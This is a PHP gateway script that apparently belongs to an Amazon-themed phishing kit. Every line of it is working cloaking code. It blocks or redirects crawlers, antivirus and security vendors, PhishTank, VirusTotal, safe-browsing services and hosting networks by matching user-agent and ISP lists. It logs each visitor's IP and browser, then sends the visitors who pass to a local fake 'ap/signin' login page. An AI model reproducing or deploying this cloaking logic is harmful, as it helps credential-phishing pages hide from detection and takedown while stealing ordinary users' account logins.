<?php
 session_start();
 require_once("main.php");
 require_once("blocker.php");
 require_once("lang.php");
 if(filesize('antibot.ini') == 1){

 }else{
   require_once("blocker2.php");
 }
 if(filesize("killbot.ini") == 1){

 }else{
   require_once("killbot.php");
 }
 if($config['block_iprange'] == "on"){
   require_once("blacklist.php");
 }
 if($config['onetime'] == "on"){
   require_once("onetime.php");
 }
 if($config['block_referral'] == "on"){
   require_once("crawlerdetect.php");
 }
 $dp=strtolower($_SERVER['HTTP_USER_AGENT']);
 $blocked_words=array("bot","above","google","docomo","mediapartners","phantomjs","lighthouse","reverseshorturl","samsung-sgh-e250","softlayer","amazonaws","cyveillance","crawler","gsa-crawler","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","apache-httpclient","lssrocketcrawler","crawler","urlredirectresolver","jetbrains","spam","windows 95","windows 98","acunetix","netsparker","007ac9","008","Feedfetcher","192.comagent","200pleasebot","360spider","4seohuntbot","50.nu","a6-indexer","admantx","amznkassocbot","aboundexbot","aboutusbot","abrave spider","accelobot","acoonbot","addthis.com","adsbot-google","ahrefsbot","alexabot","amagit.com","analytics","antbot","apercite","aportworm","EBAY","CL0NA","jabber","ebay","arabot","hotmail!","msn!","baidu","outlook!","outlook","msn","duckduckbot","hotmail","go-http-client","go-http-client/1.1","trident","presto","virustotal","unchaos","dreampassport","sygol","nutch","privoxy","zipcommander","neofonie","abacho","acoi","acoon","adaxas","agada","aladin","alkaline","amibot","anonymizer","aplix","aspseek","avant","baboom","anzwers","anzwerscrawl","crawlconvera","del.icio.us","camehttps","annotate","wapproxy","translate","feedfetcher","ask24","asked","askaboutoil","fangcrawl","amzn_assoc","bingpreview","dr.web","drweb","bilbo","blackwidow","sogou","sogou-test-spider","exabot","externalhit","ia_archiver","googletranslate","translate","proxy","dalvik","quicklook","seamonkey","sylera","safebrowsing","safesurfingwidget","preview","whatsapp","telegram","instagram","zteopen","icoreservice","untrusted");
 if($config['block_ua'] == "on"){
   foreach($blocked_words as $word2){
     if(substr_count($dp,strtolower($word2))>0 or $dp == "" or $dp == " " or $dp == "    "){
       $ip=getUserIP();
       tulis_file("result/block_bot.txt","BLOCKED USER AGENT || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ".$ip." || ".gmdate("Y-n-d")." ----> ".gmdate("H:i:s")."\n\n");
       tulis_file("result/total_bot.txt","$ip (USER AGENT)");
       header('HTTP/1.0 403 Forbidden');
       die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
       exit();
     }
   }
 }
 $Bot=array("abot","dbot","ebot","hbot","kbot","lbot","mbot","nbot","obot","pbot","rbot","sbot","tbot","vbot","ybot","zbot","bot.","bot/","_bot",".bot","/bot","-bot",":bot","(bot","crawl","slurp","spider","seek","avg","avira","bitdefender","kaspersky","sophos","virustotal","virus","accoona","acoon","adressendeutschland","ah-ha.com","ahoy","altavista","ananzi","anthill","appie","arachnophilia","arale","araneo","aranha","architext","aretha","arks","asterias","atlocal","atn","atomz","augurfind","backrub","bannana_bot","baypup","bdfetch","big brother","biglotron","bjaaland","blackwidow","blaiz","bresult","blo.","bloodhound","boitho","booch","bradley","butterfly","calif","cassandra","ccubee","cfetch","charlotte","churl","cienciaficcion","cmc","collective","comagent","combine","computingsite","csci","curl","cusco","daumoa","deepindex","delorie","depspid","deweb","die blinde kuh","digger","ditto","dmoz","docomo","download express","dtaagent","dwcp","ebiness","ebingbong","e-collector","ejupiter","emacs-w3 search engine","esther","evliya celebi","ezresult","falcon","felix ide","ferret","fetchrover","fido","findlinks","fireball","fish search","fouineur","funnelweb","gazz","gcreep","genieknows","getterroboplus","geturl","glx","goforit","golem","grabber","grapnel","gralon","griffon","gromit","grub","gulliver","hamahakki","harvest","havindex","helix","heritrix","hku www octopus","homerweb","htdig","html index","html_analyzer","htmlgobble","hubater","hyper-decontextualizer","ia_archiver","ibm_planetwide","ichiro","iconsurf","iltrovatore","image.kapsi.net","imagelock","incywincy","indexer","infobee","informant","ingrid","inktomisearch.com","inspector web","intelliagent","internet shinchakubin","ip3000","iron33","israeli-search","ivia","jack","jakarta","javabee","jetbot","jumpstation","katipo","kdd-explorer","kilroy","knowledge","kototoi","kretrieve","labelgrabber","lachesis","larbin","legs","libwww","linkalarm","link validator","linkscan","lockon","lwp","lycos","magpie","mantraagent","mapoftheinternet","marvin/","mattie","mediafox","mediapartners","mercator","merzscope","microsoft url control","minirank","miva","mj12","mnogosearch","moget","monster","moose","motor","multitext","muncher","muscatferret","mwd.search","myweb","najdi","nameprotect","nationaldirectory","nazilla","ncsa beta","nec-meshexplorer","nederland.zoek","netcarta webmap engine","netmechanic","netresearchserver","netscoop","newscan-online","nhse","nokia6682/","nomad","noyona","siteexplorer","nutch","nzexplorer","objectssearch","occam","omni","open text","openfind","openintelligencedata","orb search","osis-project","pack rat","pageboy","pagebull","page_verifier","panscient","parasite","partnersite","patric","pear.","pegasus","peregrinator","pgp key agent","phantom","phpdig","picosearch","piltdownman","pimptrain","pinpoint","pioneer","piranha","plumtreewebaccessor","pogodak","poirot","pompos","poppelsdorf","poppi","popular iconoclast","psycheclone","publisher","python","rambler","raven search","roach","road runner","roadhouse","robbie","robofox","robozilla","rules","salty","sbider","scooter","scoutjet","scrubby","search.","searchprocess","semanticdiscovery","senrigan","sg-scout","shai'hulud","shark","shopwiki","sidewinder","sift","silk","simmany","site searcher","site valet","sitetech-rover","skymob.com","sleek","smartwit","sna-","snappy","snooper","sohu","speedfind","sphere","sphider","spinner","spyder","steeler/","suke","suntek","supersnooper","surfnomore","sven","sygol","szukacz","tach black widow","tarantula","templeton","/teoma","t-h-u-n-d-e-r-s-t-o-n-e","theophrastus","titan","titin","tkwww","toutatis","t-rex","tutorgig","twiceler","twisted","ucsd","udmsearch","url check","updated","vagabondo","valkyrie","verticrawl","victoria","vision-search","volcano","voyager/","voyager-hc","w3c_validator","w3m2","w3mir","walker","wallpaper","wanderer","wauuu","wavefire","web core","web hopper","web wombat","webbandit","webcatcher","webcopy","webfoot","weblayers","weblinker","webresult monitor","webmirror","webmonkey","webquest","webreaper","websitepulse","websnarf","webstolperer","webvac","webwalk","webwatch","webwombat","webzinger","wget","whizbang","whowhere","wild ferret","worldlight","wwwc","wwwster","xenu","xget","xift","xirq","yandex","yanga","yeti","yodao","zao/","zippp","zyborg","proximic","Googlebot","Baiduspider","Cliqzbot","A6-Indexer","AhrefsBot","Genieo","BomboraBot","CCBot","URLAppendBot","DomainAppender","msnbot-media","Antivirus","YoudaoBot","MJ12bot","linkdexbot","Go-http-client","presto","BingPreview","go-http-client","go-http-client/1.1","trident","presto","virustotal","unchaos","dreampassport","sygol","nutch","privoxy","zipcommander","neofonie","abacho","acoi","acoon","adaxas","agada","aladin","alkaline","amibot","anonymizer","aplix","aspseek","avant","baboom","anzwers","anzwerscrawl","crawlconvera","del.icio.us","camehttps","annotate","wapproxy","translate","feedfetcher","ask24","asked","askaboutoil","fangcrawl","amzn_assoc","bingpreview","dr.web","drweb","bilbo","blackwidow","sogou","sogou-test-spider","exabot","externalhit","ia_archiver","mj12","okhttp","simplepie","curl","wget","virus","pipes","antivirus","python","ruby","avast","firebird","scmguard","adsbot","weblight","favicon","analytics","insights","headless","github","node","agusescan","zteopen","majestic12","SimplePie","SAMSUNG-SGH-E250","DoCoMo/2.0 N905i","SiteLockSpider","okhttp/2.5.0","ips-agent","scoutjet","UptimeRobot","FM Scene","Prevx","WindowsPowerShell");
 if($config['block_ua'] == "on"){
   foreach($Bot as $BotType){
     if(stripos($_SERVER['HTTP_USER_AGENT'],$BotType) !== false){
       $ip=getUserIP();
       tulis_file("result/block_bot.txt","BLOCKED USER AGENT || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ".$ip." || ".gmdate("Y-n-d")." ----> ".gmdate("H:i:s")."\n\n");
       tulis_file("result/total_bot.txt","$ip (USER AGENT)");
       header('HTTP/1.0 403 Forbidden');
       die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
       exit();
     }
   }
 }
 $ispnya=getisp($ip);
 $banned_isp=array('Peak 10',"M247 Ltd",'Quasi Networks LTD','SC Rusnano','GoDaddy.com, LLC','Server Plan S.r.l.','Linode','Blazing SEO','Lixux OU','Inter Connects Inc','Flokinet Ltd','LukMAN Multimedia Sp. z o.o','PIPEX-BLOCK1','IPVanish','LinkGrid LLC','Snab-Inform Private Enterprise','Cisco Systems','Network and Information Technoresulty Limited','London Wires Ltd.','Tehnoresultii Budushego LLC','Eonix Corporation','hosttech GmbH','Wowrack.com','SunGard Availability Services LP','Internap Network Services Corporation','Palo Alto Networks','PlusNet Technoresulties Ltd','Scaleway','Facebook','Host1Plus','XO Communications','Nobis Technoresulty Group','ExpressVPN','DME Hosting LLC','Prescient Software','Sungard Network Solutions','OVH SAS','Iomart Hosting Ltd','Hosting Solution','Barracuda Networks','Sungard Network Solutions','Solar VPS','PHPNET Hosting Services','DigitalOcean','Level 3 Communications','softlayer','Chelyabinsk-Signal LLC','SoftLayer Technoresulties','Complete Internet Access','london-tor.mooo.com','amazonaws','cyveillance','phishtank','tor.piratenpartei-nrw.de','cpanel66.proisp.no','tor-node.com','dreamhost','Involta','exit0.liskov.tor-relays.net','tor.tocici.com','netpilot','calyxinstitute','tor-exit','msnbot','p3pwgdsn','netcraft','University of Virginia','trendmicro','ebay','paypal','torservers','comodo','EGIHosting','ebbs.healingpathsolutions.com','healingpathsolutions.com','Solution Pro','Zayo Bandwidth','spider.clicktargetdevelopment.com','clicktargetdevelopment.com','static.spro.net','Digital Ocean','Internap Network Services Corporation','Blue Coat Systems','GANDI SAS','roamsite.com','PIPEX-BLOCK1','ColoUp','Westnet','The University of Tokyo','University','University of','QuadraNet','exit-01a.noisetor.net','noisetor.net','noisetor','vultr.com','Zscaler','Choopa','RedSwitches Pty','Quintex Alliance Consulting','www16.mailshell.com','this.is.a.tor.exit-node.net','this.is.a.tor.node.xmission.com','colocrossing.com','DedFiberCo','crawl','sucuri.net','crawler','proxy','enom','cloudflare','yahoo','trustwave','rima-tde.net','tfbnw.net','pacbell.net','tpnet.pl','ovh.net','centralnic','badware','phishing','antivirus','SiteAdvisor','McAfee','Bitdefender','avirasoft','phishtank.com','googleusercontent','OVH SAS','Yahoo','Yahoo! Inc.','Google','Google Inc.','GoDaddy','Amazon Technoresulties Inc.','Amazon','Top Level Hosting SRL','Twitter','Microsoft','Microsoft Corporation','OVH','VPSmalaysia.com.my','Madgenius.com','Barracuda Networks Inc.','Barracuda','SecuredConnectivity.net','Digital Domain','Hetzner Online','Akamai','SoftLayer','SURFnet','Creative Thought Inc.','Fastly','Return Path Inc.','WhatsApp','Instagram','Schulte Consulting LLC','Universidade Federal do Rio de Janeiro','Sectoor','Bitfolk','DIR A/S','Team Technoresulties LLC','Mainloop','Junk Email Filter Inc.','Art Matrix - Lightlink Inc.','Redpill Linpro AS','CloudFlare','ESET spol. s r.o.','AVAST Software s.r.o.','Dosarrest','Apple Inc.','Symantec','Mozilla','Netprotect SRL','Host Europe GmbH','Host Sailor Ltd.','PSINet Inc.','Daniel James Austin','RamNode','Hostalia','Xs4all Internet BV','Inktomi Corporation','Eircom Customer Assignment','9New Network Inc','Sony','Private IP Address LAN','Computer Problem Solving','Fortinet','Avira','Rackspace','Baidu','Comodo','Incapsula Inc','Orange Polska Spolka Akcyjna','Infosphere','Private Customer','SurfControl','University of Newcastle upon Tyne','Total Server Solutions','LukMAN','eSecureData','Hosting','VI Na Host Co. Ltd','B2 Net Solutions','Master Internet','Global Perfomance','Fireeye','AntiVirus','Security','Intersoft Internet','Voxility','Linode','Internet-Pro','Trustwave Holdings Inc','Online SAS','Versaweb','Liquid Web','A100 ROW','Apexis AG','Apexis','resulticWeb','Virtual1 Limited','VNET a.s.','Static IP Assignment','TerraTransit AG','Merit Network','PathsConnect','Long Thrive','LG DACOM','Secure Internet','Kaspersky','UK Dedicated Servers Limited','Customer Network','Flokinet','Simpli Networks LLC','Psychz','PrivateSystems Networks','ScanSafe Services','CachedNet','CloudVPN','Spark New Zealand Trading Ltd','Whitelabel IT Solutions Corp','Hostwinds','Hosteros LLC','HostUS','Host','ClientID','Server','Oracle','Fortinet','Unus Inc.','Public facing services','Virtual Employee Pvt Ltd','Dataline Ltd','Teksavvy Solutions Inc.','UPC Romania Bucuresti','TalkTalk Communications Limited','British Telecommunications PLC','Global Data Networks LLC','Quintex Alliance Consulting','Online S.A.S.','Content Delivery Network Ltd','Nobis Technoresulty Group LLC','Parrukatu','JSC ER-Telecom Holding','ChinaNet Fujian Province Network','QualityNetwork','Vist On-Line Ltd','The Calyx Institute','Internet Customers','OJSC Oao Tattelecom','Petersburg Internet Network Ltd.','Psychz Networks','Udasha','Onavo Mobile Ltd','Cubenode System SL','OVH Hosting Inc.','NForce Entertainment B.V.','DigitalOcean LLC','Glenayre Electronics Inc.','British Telecommunications PLC','Iomart Hosting Limited','Digital Energy Technoresulties Limited','Private Customer','Cisco Systems Inc.','Vultr Holdings LLC','Amazon.com Inc.','Web Hosting Solutions','Time Warner Cable Internet LLC','Internet Security - TC','Vertical Telecoms Broadband Networks and Internet Provider','Ventelo Wholesale','MYX Group LLC','France Telecom S.A.','Online S.A.S.','Nine Internet Solutions AG','Microsoft Azure','Choopa, LLC','Amazon','HighWinds Network','Amazon.com','Bell Canada','Digital Ocean','M247 LTD Frankfurt Infrastructure','Palo Alto Networks','Spectrum','ImOn Communications, LLC','Wintek Corporation','ServerMania','Claro Dominican Republic','013 NetVision','Amazon.com','Digital Ocean','TalkTalk','HostDime.com','AVAST Software s.r.o.','Host1Plus Cloud Servers','Amazon Data Services NoVa','Google Cloud','M-net','Digiweb ltd','Prescient Software','Eir Broadband','Solution Pro','Bell Canada','Linode','DigitalOcean','Plusnet','GigeNET','ZenLayer','NFOrce Entertainment B.V.','NewMedia Express','Telegram Messenger Network','IQ PL Sp. z o.o.','Datacamp Limited','Tahoe Internet Exchange (TahoeIX)','ITCOM Shpk','HEG US');
 if($ispblock == "on"){
   foreach($banned_isp as $isps){
     if(substr_count($ispnya,$isps)>0){
       tulis_file("result/block_bot.txt","BLOCKED ISP || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ".$ip." || ".gmdate("Y-n-d")." ----> ".gmdate("H:i:s")."\n\n");
       tulis_file("result/total_bot.txt","$ip (ISP)");
       header('HTTP/1.0 403 Forbidden');
       die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
       exit();
     }
   }
 }
 if(preg_match("/bot|crawler|spider|aws|curl|slurp/",$_SERVER['HTTP_USER_AGENT'])){
   tulis_file("result/block_bot.txt","$time | $ip | $countryname | $br | $os | BLOCKED BY BASIC BOT");
   tulis_file("result/total_bot.txt","$ip (Site Password)");
   header("location: https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
   exit();
 }
 if($config['site_pass_on'] == "on"){
   $secret=md5($ip);
   $password=$_POST[$secret];
   $mypass=md5($config['site_password']);
   if(!isset($password)){
     tulis_file("result/block_bot.txt","BLOCKED SITE PASSWORD || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ".$ip." || ".gmdate("Y-n-d")." ----> ".gmdate("H:i:s")."\n\n");
     tulis_file("result/total_bot.txt","$ip (Site Password)");
     header("location: https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
     exit();
   }else{
     $_SESSION['key']=$key;
   }
 }
 if($config['site_param_on'] == "on"){
   $secret=$config['site_parameter'];
   $password=$_GET[$secret];
   if(!isset($password)){
     tulis_file("result/block_bot.txt","BLOCKED SITE PARAM || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ".$ip." || ".gmdate("Y-n-d")." ----> ".gmdate("H:i:s")."\n\n");
     tulis_file("result/total_bot.txt","$ip (Site Parameter)");
     header('HTTP/1.0 403 Forbidden');header("location: https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
     exit();
   }else{
     $_SESSION['key']=$key;
   }
 }
 tulis_file("result/log_visitor.txt","| $time | $ip | $countryname | $br | $os");
 tulis_file("result/total_click.txt","$ip");
 echo "<script type='text/javascript'>window.top.location='ap/signin?session=".$key."';</script>";
 ?>
